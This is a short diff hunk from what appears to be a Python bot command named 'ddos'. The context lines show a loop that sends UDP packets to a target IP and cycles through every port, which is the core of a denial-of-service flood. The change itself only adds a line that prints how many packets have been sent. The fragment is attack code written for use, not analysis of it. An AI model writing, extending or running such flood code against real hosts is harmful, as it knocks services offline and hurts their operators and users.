@@ -20,5 +20,6 @@ async def ddos(event):
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
+     print(f"sending {sent} no packets to {port}")
      if port == 65534:
        port = 1
